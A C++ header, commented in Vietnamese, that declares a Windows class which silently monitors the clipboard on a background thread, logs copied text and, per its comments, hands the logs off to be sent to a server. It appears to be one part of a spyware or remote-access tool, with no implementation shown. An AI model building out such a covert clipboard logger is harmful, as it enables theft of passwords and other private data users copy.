#pragma once
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <windows.h>

class Clipboard {
private:
    std::string _logBuffer;       // Nơi lưu nội dung đã copy
    std::mutex _mutex;            // Khóa bảo vệ luồng
    std::thread _monitorThread;   // Luồng chạy ngầm
    bool _isRunning;              // Biến kiểm soát dừng/chạy

    // Lưu lại "số thứ tự" của lần copy trước đó
    // Windows tự đánh số mỗi lần Clipboard thay đổi.
    // Nếu số này thay đổi -> Có nội dung mới.
    DWORD _lastSequenceNumber;

    void RunMonitorLoop();        // Vòng lặp chính
    std::string GetClipboardText(); // Hàm lấy dữ liệu thô từ RAM

public:
    Clipboard();
    ~Clipboard();

    void StartMonitoring();
    void StopMonitoring();
    std::string GetLogs();        // Lấy dữ liệu gửi về Server
};